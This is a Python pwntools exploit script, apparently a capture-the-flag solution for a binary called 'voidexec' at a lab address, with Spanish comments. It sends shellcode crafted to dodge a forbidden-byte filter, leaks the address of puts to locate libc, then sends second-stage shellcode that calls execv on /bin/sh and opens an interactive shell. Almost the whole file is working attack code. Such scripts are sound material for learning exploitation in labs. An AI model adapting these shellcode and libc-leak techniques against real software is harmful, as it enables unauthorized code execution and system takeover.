from pwn import *

"""
Credits to: @Astharot15
"""

# Configuración de la conexión
HOST = '10.10.67.61'
PORT = 9008

# Configuración
context.log_level = 'debug'  # Para ver detalles de la comunicación

# Configuración
context(arch='amd64', os='linux')

shellcode = asm('''
    mov r10, r13
    mov r11, r13
    add r10, 0x2cb5
    sub r13, 0x23b
    mov rdi, r10
    call r13
    mov rdi, rax
    add r13, 0x23b
    mov r11, r13
    call r11
''')
libc = ELF("./libc.so.6")

#Iniciar proceso
p = process('./voidexec')
#p = remote(HOST, PORT)
#gdb.attach(p)

# Verificar bytes prohibidos
forbidden_bytes = {0x0f, 0xcd, 0x80}
assert all(b not in shellcode for b in forbidden_bytes), "Bytes prohibidos detectados!"

p.recvuntil(b"Send to void execution: ")
p.send(shellcode)

# Esperar hasta el mensaje "voided!\n"
p.recvuntil(b"voided!\n")

# Leer 8 bytes fijos para obtener el leak
leak_bytes = p.recv()

# Convertir a entero (rellenando a 8 bytes si es necesario)
puts_got = u64(leak_bytes.strip().ljust(8, b'\x00'))
log.info("Leak de put@GOT: " + hex(puts_got))

libc.address = puts_got - libc.sym['puts']
log.info("Libc base: " + hex(libc.address))

execve_addr = libc.symbols['execv']
log.info("Execve address: " + hex(execve_addr))

shellcode = asm('''
    xor    rax, rax
    push   rax
    mov    rbx, 0x68732f6e69622f
    push   rbx
    mov    rdi, rsp
    push   rax
    push   rdi
    mov    rsi, rsp
    xor    rdx, rdx
    mov    al, 0x3b
    mov r11, {}
    call r11
'''.format(hex(execve_addr)))

log.info("Jumping to: "+hex(execve_addr))

#leak_bytes = p.recv()

p.send(shellcode)

p.interactive()